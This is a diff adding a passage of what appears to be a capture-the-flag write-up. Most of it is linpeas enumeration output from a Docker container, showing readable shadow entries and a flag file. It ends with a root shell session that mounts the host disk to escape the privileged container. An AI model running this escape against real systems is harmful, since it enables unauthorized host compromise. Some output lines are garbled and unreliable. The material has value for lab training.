@@ -1056,3 +1056,533 @@ uid=10(uucp) gid=14(uucp) groups=14(uucp),14(uucp)
 uid=11(operator) gid=0(root) groups=0(root)
 uid=123(ntp) gid=123(ntp) groups=123(ntp)
 uid=13(man) gid=15(man) groups=15(man),15(man)
+uid=14(postmaster) gid=12(mail) groups=12(mail)
+uid=16(cron) gid=16(cron) groups=16(cron),16(cron)
+uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m),1(bin),2(daemon[0m),4(adm)
+uid=209(smmsp) gid=209(smmsp) groups=209(smmsp),209(smmsp)
+uid=21(ftp) gid=21(ftp) groups=21(ftp)
+uid=22(sshd) gid=22(sshd) groups=22(sshd)
+uid=25(at) gid=25(at) groups=25(at),25(at)
+uid=3(adm) gid=4(adm) groups=4(adm),3(sys),4(adm),6(disk)
+uid=31(squid) gid=31(squid) groups=31(squid),31(squid)
+uid=33(xfs) gid=33(xfs) groups=33(xfs),33(xfs)
+uid=35(games) gid=35(games) groups=35(games),100(users)
+uid=4(lp) gid=7(lp) groups=7(lp),7(lp)
+uid=405(guest) gid=100(users) groups=100(users)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=70(postgres) gid=70(postgres) groups=70(postgres)
+uid=8(mail) gid=12(mail) groups=12(mail),12(mail)
+uid=85(cyrus) gid=12(mail) groups=12(mail)
+uid=89(vpopmail) gid=89(vpopmail) groups=89(vpopmail)
+uid=9(news) gid=13(news) groups=13(news),13(news)
+
+╔══════════╣ Login now
+
+╔══════════╣ Last logons
+
+╔══════════╣ Last time logon each user
+
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+                             ╔══════════════════════╗
+═════════════════════════════╣ Software Information ╠═════════════════════════════
+                             ╚══════════════════════╝
+╔══════════╣ Useful software
+/bin/base64
+/usr/bin/nc
+/bin/ping
+/usr/bin/wget
+
+╔══════════╣ Installed Compilers
+
+╔══════════╣ Searching ssl/ssh files
+
+╔══════════╣ Searching kerberos conf files and tickets
+╚ http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory
+ptrace protection is enabled (1), you need to disable it to search for tickets inside processes memory
+-rw-r--r--    1 root     root           450 May  1  2018 /etc/krb5.conf
+[logging]
+```
+```text
+# default = FILE:/var/log/krb5libs.log
+```
+```text
+# kdc = FILE:/var/log/krb5kdc.log
+```
+```text
+# admin_server = FILE:/var/log/kadmind.log
+
+[libdefaults]
+ dns_lookup_realm = false
+ ticket_lifetime = 24h
+ renew_lifetime = 7d
+ forwardable = true
+ rdns = false
+```
+```text
+# default_realm = EXAMPLE.COM
+
+[realms]
+```
+```text
+# EXAMPLE.COM = {
+```
+```text
+#  kdc = kerberos.example.com
+```
+```text
+#  admin_server = kerberos.example.com
+```
+```text
+# }
+
+[domain_realm]
+```
+```text
+# .example.com = EXAMPLE.COM
+```
+```text
+# example.com = EXAMPLE.COM
+
+tickets kerberos Not Found
+klist Not Found
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/passwd
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
+                               ╚═══════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+strace Not Found
+-rwsr-xr-x    1 root     root       25.9K May  1  2018 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x    1 root     root       37.9K May  1  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwxr-sr-x    1 root     tty        25.8K May  1  2018 /usr/bin/wall
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current capabilities:
+CapInh:	0000003fffffffff
+CapPrm:	0000003fffffffff
+CapEff:	0000003fffffffff
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+CapInh:	0000003fffffffff
+CapPrm:	0000003fffffffff
+CapEff:	0000003fffffffff
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities (limited to 50):
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+
+╔══════════╣ Unexpected in root
+/.dockerenv
+/app
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ /etc/passwd is writable
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. root:::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+postgres:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+═╣ Can I read shadow plists? ............ No
+═╣ Can I write shadow plists? ........... No
+═╣ Can I read opasswd file? ............. No
+═╣ Can I write in network-scripts? ...... No
+═╣ Can I read root folder? .............. total 8
+drwx------    2 root     root          4096 Dec 20  2018 .
+drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/root/
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/tmp/hsperfdata_root/1
+/tmp/cgroup_3628d4/cgroup.procs
+/tmp/cgroup_3628d4/memory.use_hierarchy
+/tmp/cgroup_3628d4/memory.kmem.tcp.usage_in_bytes
+/tmp/cgroup_3628d4/cgroup.sane_behavior
+/tmp/cgroup_3628d4/memory.force_empty
+/tmp/cgroup_3628d4/memory.pressure_level
+/tmp/cgroup_3628d4/memory.move_charge_at_immigrate
+/tmp/cgroup_3628d4/memory.kmem.tcp.max_usage_in_bytes
+/tmp/cgroup_3628d4/memory.max_usage_in_bytes
+/tmp/cgroup_3628d4/memory.stat
+/tmp/cgroup_3628d4/memory.kmem.slabinfo
+/tmp/cgroup_3628d4/docker/cgroup.procs
+/tmp/cgroup_3628d4/docker/memory.use_hierarchy
+/tmp/cgroup_3628d4/docker/memory.kmem.tcp.usage_in_bytes
+/tmp/cgroup_3628d4/docker/memory.soft_limit_in_bytes
+/tmp/cgroup_3628d4/docker/memory.force_empty
+/tmp/cgroup_3628d4/docker/memory.pressure_level
+/tmp/cgroup_3628d4/docker/memory.move_charge_at_immigrate
+/tmp/cgroup_3628d4/docker/memory.kmem.tcp.max_usage_in_bytes
+/tmp/cgroup_3628d4/docker/memory.max_usage_in_bytes
+/tmp/cgroup_3628d4/docker/memory.oom_control
+/tmp/cgroup_3628d4/docker/memory.stat
+/tmp/cgroup_3628d4/docker/memory.kmem.slabinfo
+/tmp/cgroup_3628d4/docker/memory.limit_in_bytes
+/tmp/cgroup_3628d4/docker/memory.swappiness
+/tmp/cgroup_3628d4/docker/memory.numa_stat
+/tmp/cgroup_3628d4/docker/memory.kmem.failcnt
+/tmp/cgroup_3628d4/docker/memory.kmem.max_usage_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.procs
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.use_hierarchy
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.usage_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.soft_limit_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.force_empty
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.pressure_level
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.move_charge_at_immigrate
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.max_usage_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.max_usage_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.oom_control
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.stat
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.slabinfo
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.limit_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.swappiness
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.numa_stat
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.failcnt
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.max_usage_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.usage_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/tasks
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.failcnt
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.failcnt
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.limit_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/notify_on_release
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.usage_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.limit_in_bytes
+/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.clone_children
+/tmp/cgroup_3628d4/docker/memory.usage_in_bytes
+/tmp/cgroup_3628d4/docker/tasks
+/tmp/cgroup_3628d4/docker/memory.failcnt
+/tmp/cgroup_3628d4/docker/cgroup.event_control
+/tmp/cgroup_3628d4/docker/memory.kmem.tcp.failcnt
+/tmp/cgroup_3628d4/docker/memory.kmem.limit_in_bytes
+/tmp/cgroup_3628d4/docker/notify_on_release
+/tmp/cgroup_3628d4/docker/memory.kmem.usage_in_bytes
+/tmp/cgroup_3628d4/docker/memory.kmem.tcp.limit_in_bytes
+/tmp/cgroup_3628d4/docker/cgroup.clone_children
+/tmp/cgroup_3628d4/memory.limit_in_bytes
+/tmp/cgroup_3628d4/memory.numa_stat
+/tmp/cgroup_3628d4/memory.kmem.failcnt
+/tmp/cgroup_3628d4/memory.kmem.max_usage_in_bytes
+/tmp/cgroup_3628d4/memory.usage_in_bytes
+/tmp/cgroup_3628d4/tasks
+/tmp/cgroup_3628d4/memory.failcnt
+/tmp/cgroup_3628d4/cgroup.event_control
+/tmp/cgroup_3628d4/memory.kmem.tcp.failcnt
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/cgroup.procs
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.use_hierarchy
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.usage_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.soft_limit_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.force_empty
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.pressure_level
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.move_charge_at_immigrate
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.max_usage_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.max_usage_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.oom_control
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.stat
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.slabinfo
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.limit_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.swappiness
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.numa_stat
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.failcnt
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.max_usage_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.usage_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/tasks
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.failcnt
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/cgroup.event_control
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.failcnt
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.limit_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/notify_on_release
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.usage_in_bytes
+/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.limit_in_bytes
+
+╔══════════╣ Files inside /root (limit 20)
+total 8
+drwx------    2 root     root          4096 Dec 20  2018 .
+drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
+
+╔══════════╣ Files inside others home (limit 20)
+
+╔══════════╣ Searching installed mail applications
+sendmail
+
+╔══════════╣ Mails (limit 50)
+
+╔══════════╣ Backup files (limited 100)
+
+╔══════════╣ Web files?(output limit)
+
+╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r--    1 root     root            19 Dec 11  2021 /opt/.flag1
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rwxr-xr-x    1 root     root        828098 Jul  9 01:13 /tmp/linpeas.sh
+-rw-------    1 root     root         32768 Jul  9 01:13 /tmp/hsperfdata_root/1
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/cgroup.procs
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.use_hierarchy
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.kmem.tcp.usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 00:46 /tmp/cgroup_3628d4/memory.soft_limit_in_bytes
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/cgroup.sane_behavior
+--w-------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.force_empty
+----------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.pressure_level
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.move_charge_at_immigrate
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.kmem.tcp.max_usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.max_usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 00:46 /tmp/cgroup_3628d4/memory.oom_control
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.stat
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/cgroup.procs
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.use_hierarchy
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.soft_limit_in_bytes
+--w-------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.force_empty
+----------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.pressure_level
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.move_charge_at_immigrate
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.max_usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.max_usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.oom_control
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.stat
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.slabinfo
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.limit_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.swappiness
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.numa_stat
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.failcnt
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.max_usage_in_bytes
+0m/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.procs
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.use_hierarchy
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.soft_limit_in_bytes
+--w-------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.force_empty
+----------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.pressure_level
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.move_charge_at_immigrate
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.max_usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.max_usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.oom_control
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.stat
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup7f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.slabinfo
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.limit_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.swappiness
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.numa_stat
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.failcnt
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.max_usage_in_bytes
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/tasks
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.failcnt
+--w--w--w-    1 root     root             0 Jul  9 00:46 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.event_control
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.failcnt
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.limit_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/notify_on_release
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.limit_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.clone_children
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/tasks
+l  9 01:13 /tmp/cgroup_3628d4/docker/memory.failcnt
+--w--w--w-    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/cgroup.event_control
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.failcnt
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.limit_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/notify_on_release
+-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.usage_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.limit_in_bytes
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/cgroup.clone_children
+-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.limit_in_bytes
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/usr/lib/jvm/java-1.8-openjdk/jre/lib/management/jmxremote.password.template
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
+                                ╚════════════════╝
+Regexes to search for API keys aren't activated, use param '-r' 
+
+Running linpeas, we can see that privileged mode is enabled. It allows us to access the host filesystem from within the docker container. We simply have to mount the disk.
+
+bash-4.4# fdisk -l
+fdisk -l
+Disk /dev/xvda: 40 GiB, 42949672960 bytes, 83886080 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x3650a2cc
+
+Device     Boot Start      End  Sectors Size Id Type
+/dev/xvda1 *     2048 83886046 83883999  40G 83 Linux
+
+Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+
+Disk /dev/xvdf: 1 GiB, 1073741824 bytes, 2097152 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+
+bash-4.4# mkdir /tmp/realroot
+mkdir /tmp/realroot
+bash-4.4# ls
+ls
+cgroup_3628d4
+f
+hsperfdata_root
+linpeas.sh
+realroot
+tomcat-docbase.8080.609427956221441513
+tomcat.8080.4213912677533578857
+tomcat.8080.6148304113761771648
+tomcat.8080.632468063830260160
+bash-4.4# mount /dev/xvda1 /tmp/realroot
+mount /dev/xvda1 /tmp/realroot
+bash-4.4# cd /realroot
+cd /realroot
+bash: cd: /realroot: No such file or directory
+bash-4.4# cd realroot
+cd realroot
+bash-4.4# ls
+ls
+bin             initrd.img.old  opt             sys
+boot            lib             proc            tmp
+dev             lib64           root            usr
+etc             lost+found      run             var
+home            media           sbin            vmlinuz
+initrd.img      mnt             srv             vmlinuz.old
+bash-4.4# ls -lah
+ls -lah
+total 100
+drwxr-xr-x   22 root     root        4.0K Jul  9 00:45 .
+drwxrwxrwt    1 root     root        4.0K Jul  9 01:16 ..
+drwxr-xr-x    2 root     root        4.0K Dec  8  2021 bin
+drwxr-xr-x    3 root     root        4.0K Dec  8  2021 boot
+drwxr-xr-x    4 root     root        4.0K Dec  8  2021 dev
+drwxr-xr-x   94 root     root        4.0K Dec 13  2021 etc
+drwxr-xr-x    3 root     root        4.0K Dec 13  2021 home
+lrwxrwxrwx    1 root     root          34 Dec  8  2021 initrd.img -> boot/initrd.img-4.15.0-163-generic
+lrwxrwxrwx    1 root     root          34 Dec  8  2021 initrd.img.old -> boot/initrd.img-4.15.0-163-generic
+drwxr-xr-x   20 root     root        4.0K Dec 13  2021 lib
+drwxr-xr-x    2 root     root        4.0K Dec  8  2021 lib64
+drwx------    2 root     root       16.0K Dec  8  2021 lost+found
+drwxr-xr-x    2 root     root        4.0K Dec  8  2021 media
+drwxr-xr-x    2 root     root        4.0K Dec  8  2021 mnt
+drwxr-xr-x    3 root     root        4.0K Dec 13  2021 opt
+drwxr-xr-x    2 root     root        4.0K Apr 24  2018 proc
